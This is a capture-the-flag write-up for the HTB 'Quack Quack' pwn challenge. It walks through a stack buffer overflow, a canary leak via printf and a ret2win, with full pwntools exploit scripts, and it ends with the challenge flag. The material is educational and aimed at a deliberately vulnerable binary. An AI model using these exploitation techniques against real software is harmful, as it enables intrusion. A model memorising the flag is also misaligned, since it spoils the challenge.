# Quack Quack

{% hint style="info" %}
Category: PWN

Difficuly: Very Easy

_Solved after ended_.
{% endhint %}

## Description

> On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!

## Required Knowledge

* C programming
* Buffer overflow vulnerability
* Stack canary protection
* Hijack program flow (ret2win)

## Solve Walkthrough

### 1. Basic File Checks

First, I do basic file check using file command.

{% code overflow="wrap" %}
```bash
./quack_quack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=225daf82164eadc6e19bee1cd1965754eefed6aa, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

From the output above, that is a **64-bit dynamically linked ELF binary**. Next, see the protections using `checksec` command.&#x20;

```bash
[*] '/home/hurtz4eva/Nextcloud/CTF/international/htb-cyber-apocalypse/2025/pwn/Quack_Quack/challenge/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

As you can see, this binary is full of protection, except PIE / PIC (Position Independent Code). That means every we run the binary, the memory address is still same, such as the buffer, local variable, etc.

### 2. Analyze the Binary

Unlike reverse engineering challenge before, in pwn we've to know the fundamentals of memory layout, such as stack, heap, etc. In this case, vulnerability of the binary is happen in the stack that can cause buffer overflow. But, inside the binary found a protection called "**Stack Canary**". Basically, it just random value located at `$RBP-0x8` (**64-bit**) / `$EBP-0x4` (**32-bit**).

How can we bypass the Stack Canary protection? We've to know that read function in C is not completely safe. The read function is **leakable**, which means that after input is **not ended with NULL terminated string (`\x00`)**. If the string or array of characters is not null terminated string, it can be **leaked some information in the stack**, including _stack canary_. Okay, let's start with decompile the binary.

{% tabs %}
{% tab title="main" %}
{% code lineNumbers="true" %}
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  duckling();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
{% endcode %}
{% endtab %}

{% tab title="duckling" %}
<pre class="language-c" data-line-numbers><code class="lang-c"><strong>void duckling(void)
</strong>
{
  char *chk_substring;
  long in_FS_OFFSET;
  char buffer [32];
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  buffer[0] = '\0';
  buffer[1] = '\0';
  buffer[2] = '\0';
  buffer[3] = '\0';
  buffer[4] = '\0';
  buffer[5] = '\0';
  buffer[6] = '\0';
  buffer[7] = '\0';
  buffer[8] = '\0';
  buffer[9] = '\0';
  buffer[10] = '\0';
  buffer[0xb] = '\0';
  buffer[0xc] = '\0';
  buffer[0xd] = '\0';
  buffer[0xe] = '\0';
  buffer[0xf] = '\0';
  buffer[0x10] = '\0';
  buffer[0x11] = '\0';
  buffer[0x12] = '\0';
  buffer[0x13] = '\0';
  buffer[0x14] = '\0';
  buffer[0x15] = '\0';
  buffer[0x16] = '\0';
  buffer[0x17] = '\0';
  buffer[0x18] = '\0';
  buffer[0x19] = '\0';
  buffer[0x1a] = '\0';
  buffer[0x1b] = '\0';
  buffer[0x1c] = '\0';
  buffer[0x1d] = '\0';
  buffer[0x1e] = '\0';
  buffer[0x1f] = '\0';
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,buffer,0x66);
  chk_substring = strstr(buffer,"Quack Quack ");
  if (chk_substring == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",chk_substring + 0x20);
  read(0,&#x26;local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
</code></pre>
{% endtab %}

{% tab title="duck_attack" %}
{% code lineNumbers="true" %}
```c
void duck_attack(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int flag_file;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  flag_file = open("./flag.txt",0);
  if (flag_file < 0) {
    perror("\nError opening flag.txt, please contact an Administrator\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(flag_file,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(flag_file);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

In the `main` function is only call `duckling` function. If we take a look inside duckling function, we can directly see that it's happen BOF vuln in our first input : `read(0,buffer,0x66)`. But, how can we leak the stack canary ?

Notice that in the `printf("Quack Quack %s, ready to fight the Duck?\n\n> ",chk_substring + 0x20);`  can be leak some information in the stack. It's because the output will print **32 bytes (0x20) more information after `"Quack Quack "` is found**. Okay, let's do a simple math calculation.

```
============= STACK LAYOUT =============

[       RET       ] // lives in $rbp+0x8
[    Saved RBP    ] 
[   Stack Canary  ] // lives in $rbp-0x8
[  .............  ] // $rbp-0x10
[  .............  ] // $rbp-0x18
[  .............  ] // $rbp-0x20
[  .............  ] // $rbp-0x28
[  .............  ] // $rbp-0x30
[  .............  ] // $rbp-0x38
[  .............  ] // $rbp-0x40
[  .............  ] // $rbp-0x48
[  .............  ] // $rbp-0x50
[  .............  ] // $rbp-0x58
[  .............  ] // $rbp-0x60
[  .............  ] // $rbp-0x68
[  .............  ] // $rbp-0x70
[  .............  ] // $rbp-0x78
[      Buffer     ] // lives in $rbp-0x80
```

Total of our input is **0x66 bytes** or **102 bytes in decimal**. Our input is started from `$rbp-0x80` until `$rbp-0x20 - 2` (8 bytes every memory cells). Max input of 102 bytes is not only contain junk or a bunch of `'A'` characters, but including the **`"Quack Quack "`** string that have **12 bytes**. So, the total bytes of our input will be 102 - 12 = 90 bytes - 1 = **89 bytes**. What is 1 byte ? it just not to make the program exit.

What is `strstr` function does? It just to **find a substring (param2) in the target string (param1)**.

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Okay, so our first input will be `"A"*89 + "Quack Quack "` . To get more clear of leaked information, I recommend you to see with pwntools.

### 3. Exploit the Binary

Here's the first script to leak the stack canary.

{% code title="leak_canary.py" lineNumbers="true" %}
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF('./quack_quack', checksec=0)
context.binary = exe
context.log_level = "DEBUG"

# Start the process.
LOCAL = True
if LOCAL:
    io = exe.process()
else:
    io = remote('94.237.54.232', 39055)

# Prepare the payload for the first input.
payload = b"" # -----------------------< Start payload.
payload += b"A" * 32 # ----------------< Fill the 32 bytes buffer.
payload += b"B" * (89 - 32) # ---------< Overflow until 89 bytes.
payload += b"Quack Quack " # ----------< Pass the strstr condition (12 more bytes).

# Send the payload in the first input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Maintain current session.
io.interactive()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Now, we successfully leak the canary. But wait, is that the canary start with the **NULL byte** character (`\x00`)? Yap, that's true, so we need to adjust the output to be stored as canary. For the next input we need to calculate before canary value, so it will not errors or stack smashing detected. Our next input is started from `$rbp-0x60` until **0x6a bytes** or **106 bytes** in decimal. But, we don't need input until the max size, we only need input until `$rbp-0x10` or **88 bytes** more.

```
============= STACK LAYOUT =============

[       RET       ] // lives in $rbp+0x8
[    Saved RBP    ] 
[   Stack Canary  ] // lives in $rbp-0x8
[  .............  ] // $rbp-0x10 - Last of second input - 88 bytes
[  .............  ] // $rbp-0x18
[  .............  ] // $rbp-0x20
[  .............  ] // $rbp-0x28
[  .............  ] // $rbp-0x30
[  .............  ] // $rbp-0x38
[  .............  ] // $rbp-0x40
[  .............  ] // $rbp-0x48
[  .............  ] // $rbp-0x50
[  .............  ] // $rbp-0x58
[  .............  ] // $rbp-0x60 - Second input
[  .............  ] // $rbp-0x68
[  .............  ] // $rbp-0x70
[  .............  ] // $rbp-0x78
[      Buffer     ] // Start input
```

After we now the padding of our second input, then we can do **ret2win** attack to call `duck_attack` function and read the flag. So, here's my final exploit script.

{% code title="exploit.py" lineNumbers="true" %}
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF('./quack_quack', checksec=0)
context.binary = exe
context.log_level = "DEBUG"

# Start the process.
LOCAL = False
if LOCAL:
    io = exe.process()
else:
    io = remote('94.237.54.232', 39055)

# Prepare the payload for the first input.
payload = b"" # -----------------------< Start payload.
payload += b"A" * 32 # ----------------< Fill the 32 bytes buffer.
payload += b"B" * (89 - 32) # ---------< Overflow until 89 bytes.
payload += b"Quack Quack " # ----------< Pass the strstr condition (12 more bytes).

# Send the payload in the first input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Adjust the leaked canary output.
canary_position = io.recv(timeout=1).split()[2].rstrip(b',')
fixed_output = b'\x00' + canary_position[-7:]
leaked_canary = u64(fixed_output.ljust(8, b'\x00'))
log.info(f"Leaked stack canary is: {hex(leaked_canary)}")

# Prepare payload for the 2nd input.
win_addr = exe.symbols['duck_attack']

payload = b"" # -----------------------< Start payload.
payload += b"C"*88 # ------------------< Padding until Stack Canary.
payload += p64(leaked_canary) # -------< Leaked canary value.
payload += p64(0xdeadbeef) # ----------< Fake address for $RBP.
payload += p64(win_addr) # ------------< Ret2win to read the flag.

# Send the payload + canary in the second input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Print the flag.
flag = re.search(r'HTB{.*}', io.recvall(timeout=1).decode())
print(f"Flag --> {flag.group(0)}") if flag else print("Failed to get the flag!")

# Maintain current session.
io.interactive()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

After several attempts about 3 - 10 times,t hen I can successfully read the flag. Okay, now let's crack the remote machine.

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

## Flag

<kbd>HTB{\~c4n4ry\_g035\_qu4ck\_qu4ck\~\_c2c1c5fea57c3625c35e8a70d8b4be0a}</kbd>
